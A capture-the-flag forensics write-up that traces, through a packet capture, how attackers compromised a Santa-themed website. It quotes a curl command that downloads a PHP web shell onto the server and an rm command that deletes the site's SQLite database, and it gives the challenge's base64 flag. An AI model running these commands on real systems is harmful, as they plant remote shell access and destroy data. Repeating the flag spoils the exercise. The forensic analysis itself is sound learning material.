# Exploration #
Prompt:
> baby APT
>
> This is the most wonderful time of the year, but not for Santa's incident response team. Since Santa went digital, everyone can write a letter to him using his brand new website. Apparently an APT group hacked their way in to Santa's server and destroyed his present list. Could you investigate what happened?

We are given a pcap file to analyze and find the root of the problem.

# christmaswishlist.pcap #
opening this up in wireshark, we can see a large list of network traffic. Thankfully, they said that everyone can send him a letter with his new website. With this information, we can filter the protocols for HTTP requests.

We immediately see a suspicious HTTP request, where the input has a command to run
```
curl https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php -o bg.php 
```

This command ran and downloaded PHP code into a new file they created directly on the server.

# bg.php #
After analyzing the PHP downloaded, it looks like its a simple PHP program to just run any POST request in the shell. This allows the attacker to run any command on the server.

We see immediatly after that download, there are other requests to `bg.php` that are downloading the pwd files, the groups, and looking for files on the server.

One of the request included the following command:
```
rm  /var/www/html/sites/default/files/.ht.sqlite && echo SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59 > /dev/null 2>&1 && ls -al  /var/www/html/sites/default/files
```

This command is removing the sqlite files, and adding text to some file on the server, then listing the files in default.

I took `SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59` and decoded it as base64, and got the flag!